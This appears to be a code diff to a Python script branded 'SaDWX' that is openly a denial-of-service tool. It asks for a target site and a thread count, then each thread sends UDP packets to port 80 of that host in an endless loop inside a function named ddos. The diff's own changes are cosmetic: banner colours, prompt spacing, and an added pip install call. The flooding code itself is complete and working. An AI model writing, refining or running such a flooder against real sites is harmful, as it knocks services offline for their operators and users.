@@ -8,20 +8,22 @@ import sys
 import os
 import _thread
 from colorama import Fore, Back, Style
+os.system ('pip3 install colorama')
 os.system ('clear')
 cyan = Fore.CYAN
 red = Fore.RED
+white = Fore.WHITE
 magenta = Fore.MAGENTA
 lightgreen = Fore.LIGHTGREEN_EX
-print(magenta+'''
-    OboOOOOOOOOOOOOO.OOo. .oOOOOOo.    OOOo.oOOOOOo..OOOOOOOOOOO0   
-    OOOOoOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOOOOOOOOOOOOOO00   
-    `OOOOO     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO0    `OOOOo     
+print(lightgreen+'''
+    OboOOOOOOOOOOOOO.OOoOOoOOOOOo.    OOOo.oOOOOOoOOOOOOOOOOOOO0   
+    OOOOoOOOOOOOOOOOOOOOOOOOOOOOOo.   `"OOOOOOOOOOOOOOOOOOOOOO00   
+    `OOOOO     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO0    `OOOOo'''+white+'''    
     .OOOO"            `OOOOOOOOOOOOOOOOOOOOOOOOOO"            `OO   
    OOOOO                 "OOOOOOOOOOOOOOOO"`                oOO     
    oOOOOOba.               .adOOOOOOOOOOba             .adOOOOo.    
   oOOOOOOOOOOOOOba.    .adOOOOOOOOOOOOOOOOOOOba.     .adOOOOOOOOOOOO
- OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  "OOOOOOOOOOOOO.OOOOOOOOOOOOOO  
+ OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  "OOOOOOOOOOOOO.OOOOOOOOOOOOOO'''+red+'''  
  "OOOO"       "YOoOOOOMOIONODOO"`      "OOROAOPOEOOOoOY"     "OOO"  
     Y           "OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?"        :`
     :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
@@ -31,11 +33,11 @@ print(magenta+'''
     .                  .     OP"          : o     .
 '''+lightgreen+'''
 -------------------------------------------------------------------
-×××××××××××××××××××××××××××××××SaDWX××××××××××××××××××××××××××××××
+×××××××××××××××××××××××××××××××'''+magenta+'''SaDWX'''+lightgreen+'''××××××××××××××××××××××××××××××
 -------------------------------------------------------------------
 ''')
-site = input(cyan+'Enter your site url'+red+'#==>>>')
-thread_count = input(lightgreen+'Enter your thread'+red+'#==>>>')
+site = input(cyan+'Enter your site url'+red+' #==>>>')
+thread_count = input(lightgreen+'Enter your thread'+red+' #==>>>')
 ip = socket.gethostbyname(site)
 UDP_PORT = 80
 MESSAGE = '</SaDWX/>'
@@ -46,7 +48,7 @@ def ddos(i):
     while 1:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
-        print(magenta+'packet Sent1'+red+'!')
+        print(magenta+'packet Sent1'+red+'! :)')
 for i in range(int(thread_count)):
     try:
         _thread.start_new_thread(ddos, ("Thread-" + str(i),))
